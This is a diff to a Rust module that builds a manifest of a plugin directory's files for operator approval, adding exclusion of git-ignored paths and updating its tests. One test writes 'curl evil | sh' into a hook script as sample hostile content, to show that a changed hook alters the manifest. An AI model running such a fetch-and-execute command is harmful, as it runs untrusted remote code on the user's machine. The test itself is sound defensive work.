@@ -20,6 +20,12 @@
 //! repository is not. A directory already walked is not walked again, so a
 //! link back up ends. Anything that is neither a file, a directory nor a link
 //! is recorded by its kind and never opened, so a FIFO is not waited on.
+//!
+//! What git ignores and does not track is left out, as if it were not there:
+//! no pull delivers it, and it is what a build, an interpreter's cache or the
+//! operator's own run writes, so agreeing to it would put the question back
+//! whenever the project was built and leave a build's output, past what a
+//! config may name, a directory nobody could agree to.
 
 use std::collections::BTreeSet;
 use std::path::{Path, PathBuf};
@@ -85,6 +91,31 @@ impl Default for Budget {
     }
 }
 
+/// The paths git ignores and does not track, by their real paths, which a
+/// walk leaves out.
+#[derive(Debug, Default)]
+pub struct Ignored(BTreeSet<PathBuf>);
+
+impl Ignored {
+    /// The paths `listing` names — `git ls-files -z --others --ignored
+    /// --directory` run at `root`, the repository's real root — as paths
+    /// under it.
+    pub fn listed(root: &Path, listing: &str) -> Self {
+        Self(
+            listing
+                .split('\0')
+                .filter(|entry| !entry.is_empty())
+                .map(|entry| root.join(entry.trim_end_matches('/')))
+                .collect(),
+        )
+    }
+
+    /// Whether `path`, or a directory it is under, is one git ignores.
+    fn holds(&self, path: &Path) -> bool {
+        !self.0.is_empty() && path.ancestors().any(|at| self.0.contains(at))
+    }
+}
+
 /// How deep a directory may nest.
 const DEPTH: usize = 32;
 
@@ -107,12 +138,14 @@ pub struct Manifest {
 /// directory untrusted, since nobody could agree to what it holds.
 ///
 /// A directory in `avoid` — a CLI's own, which keeps its sign-in — is not
-/// walked into however the walk reaches it, and leaves no manifest.
+/// walked into however the walk reaches it, and leaves no manifest. What
+/// `ignored` holds is left out.
 pub fn of(
     dir: &Path,
     root: &Path,
     budget: &mut Budget,
     avoid: &[PathBuf],
+    ignored: &Ignored,
 ) -> Result<Manifest, String> {
     let real = |path: &Path| std::fs::canonicalize(path).map_err(|error| error.to_string());
     let dir = real(dir)?;
@@ -126,6 +159,7 @@ pub fn of(
         walked: BTreeSet::from([dir.clone()]),
         budget,
         avoid,
+        ignored,
     };
     walk.directory(&dir, "", 0)?;
     Ok(walk.manifest)
@@ -139,6 +173,7 @@ struct Walk<'a> {
     walked: BTreeSet<PathBuf>,
     budget: &'a mut Budget,
     avoid: &'a [PathBuf],
+    ignored: &'a Ignored,
 }
 
 impl Walk<'_> {
@@ -149,19 +184,27 @@ impl Walk<'_> {
                 "{under} is the operator's own, a CLI's directory or the home directory, and is not read"
             ));
         }
+        if self.ignored.holds(&real) {
+            return Ok(());
+        }
         if depth > DEPTH {
             return Err(format!("nests deeper than {DEPTH} directories"));
         }
         let too_many =
             || format!("holds more than the {ENTRIES} entries the directories a config names may");
         // Counted as they are listed rather than once they all are, so a
-        // directory of a million entries is not listed whole first.
+        // directory of a million entries is not listed whole first. What git
+        // ignores costs nothing: a build's output is not the clone's.
         let mut names: Vec<std::ffi::OsString> = Vec::new();
         for entry in std::fs::read_dir(dir).map_err(|error| error.to_string())? {
+            let name = entry.map_err(|error| error.to_string())?.file_name();
+            if self.ignored.holds(&dir.join(&name)) {
+                continue;
+            }
             if names.len() >= self.budget.entries {
                 return Err(too_many());
             }
-            names.push(entry.map_err(|error| error.to_string())?.file_name());
+            names.push(name);
         }
         self.budget.entries -= names.len();
         names.sort();
@@ -204,7 +247,7 @@ impl Walk<'_> {
             if self.walked.insert(real.clone()) {
                 self.directory(&real, &format!("{shown}/"), depth + 1)?;
             }
-        } else if real.is_file() {
+        } else if real.is_file() && !self.ignored.holds(&real) {
             if self.avoid.iter().any(|avoid| real.starts_with(avoid)) {
                 return Err(format!(
                     "{shown} leads into the operator's own, a CLI's directory or the home directory, and is not read"
@@ -258,16 +301,34 @@ mod tests {
         let dir = tempfile::tempdir().expect("a temporary directory can be created");
         write(&dir.path().join("a.json"), "{}");
         write(&dir.path().join("hooks/x.sh"), "echo hi");
-        let first =
-            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
+        let first = of(
+            dir.path(),
+            dir.path(),
+            &mut Budget::default(),
+            &[],
+            &Ignored::default(),
+        )
+        .expect("the directory is read");
         assert_eq!(first.files, 2);
 
         write(&dir.path().join("hooks/x.sh"), "curl evil | sh");
-        let rewritten =
-            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
+        let rewritten = of(
+            dir.path(),
+            dir.path(),
+            &mut Budget::default(),
+            &[],
+            &Ignored::default(),
+        )
+        .expect("the directory is read");
         write(&dir.path().join("hooks/y.sh"), "");
-        let added =
-            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
+        let added = of(
+            dir.path(),
+            dir.path(),
+            &mut Budget::default(),
+            &[],
+            &Ignored::default(),
+        )
+        .expect("the directory is read");
 
         assert_ne!(first, rewritten);
         assert_ne!(rewritten, added);
@@ -282,13 +343,26 @@ mod tests {
         let dir = tempfile::tempdir().expect("a temporary directory can be created");
         std::os::unix::fs::symlink(&secret, dir.path().join("linked"))
             .expect("the temporary directory is writable");
-        let first =
-            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
+        let first = of(
+            dir.path(),
+            dir.path(),
+            &mut Budget::default(),
+            &[],
+            &Ignored::default(),
+        )
+        .expect("the directory is read");
 
         write(&secret, "two");
 
         assert_eq!(
-            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read"),
+            of(
+                dir.path(),
+                dir.path(),
+                &mut Budget::default(),
+                &[],
+                &Ignored::default()
+            )
+            .expect("the directory is read"),
             first
         );
         let real = std::fs::canonicalize(&secret).expect("the file was just written");
@@ -316,8 +390,16 @@ mod tests {
             .expect("the temporary directory is writable");
         std::os::unix::fs::symlink("..", plug.join("up"))
             .expect("the temporary directory is writable");
-        let of =
-            || of(&plug, repo.path(), &mut Budget::default(), &[]).expect("the directory is read");
+        let of = || {
+            of(
+                &plug,
+                repo.path(),
+                &mut Budget::default(),
+                &[],
+                &Ignored::default(),
+            )
+            .expect("the directory is read")
+        };
         let first = of();
 
         write(&repo.path().join("scripts/run.js"), "two()");
@@ -339,8 +421,14 @@ mod tests {
             .expect("mkfifo runs");
         assert!(made.success(), "the FIFO is made");
 
-        let manifest =
-            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect("the directory is read");
+        let manifest = of(
+            dir.path(),
+            dir.path(),
+            &mut Budget::default(),
+            &[],
+            &Ignored::default(),
+        )
+        .expect("the directory is read");
 
         assert_eq!(manifest.text, "\"other\"\t\"pipe\"\n");
     }
@@ -354,7 +442,14 @@ mod tests {
         }
 
         assert_eq!(
-            of(dir.path(), dir.path(), &mut Budget::default(), &[]).expect_err("too many entries"),
+            of(
+                dir.path(),
+                dir.path(),
+                &mut Budget::default(),
+                &[],
+                &Ignored::default()
+            )
+            .expect_err("too many entries"),
             format!("holds more than the {ENTRIES} entries the directories a config names may")
         );
     }
@@ -370,7 +465,42 @@ mod tests {
             .expect("the temporary directory is writable");
         let avoid = [std::fs::canonicalize(repo.path().join(".claude")).expect("it was just made")];
 
-        assert!(of(&plug, repo.path(), &mut Budget::default(), &avoid).is_err());
+        assert!(
+            of(
+                &plug,
+                repo.path(),
+                &mut Budget::default(),
+                &avoid,
+                &Ignored::default()
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn what_git_ignores_and_does_not_track_is_left_out_and_costs_nothing() {
+        let repo = tempfile::tempdir().expect("a temporary directory can be made");
+        let plug = repo.path().join("plug");
+        write(&plug.join("a.py"), "one");
+        for n in 0..=ENTRIES {
+            write(&plug.join(format!("__pycache__/m{n}.pyc")), "built");
+        }
+        write(&plug.join("built.so"), "built");
+        let root = std::fs::canonicalize(repo.path()).expect("it was just made");
+        let ignored = Ignored::listed(&root, "plug/__pycache__/\0plug/built.so\0");
+        let manifest = || {
+            of(&plug, repo.path(), &mut Budget::default(), &[], &ignored)
+                .expect("what is left is within the budget")
+        };
+        let before = manifest();
+        assert_eq!(before.files, 1, "{}", before.text);
+
+        write(&plug.join("built.so"), "built again");
+        write(&plug.join("__pycache__/new.pyc"), "built");
+        assert_eq!(manifest(), before);
+
+        write(&plug.join("a.py"), "two");
+        assert_ne!(manifest(), before);
     }
 
     #[test]
@@ -384,7 +514,25 @@ mod tests {
             bytes: BYTES,
         };
 
-        assert!(of(&dir.path().join("a"), dir.path(), &mut budget, &[]).is_ok());
-        assert!(of(&dir.path().join("b"), dir.path(), &mut budget, &[]).is_err());
+        assert!(
+            of(
+                &dir.path().join("a"),
+                dir.path(),
+                &mut budget,
+                &[],
+                &Ignored::default()
+            )
+            .is_ok()
+        );
+        assert!(
+            of(
+                &dir.path().join("b"),
+                dir.path(),
+                &mut budget,
+                &[],
+                &Ignored::default()
+            )
+            .is_err()
+        );
     }
 }
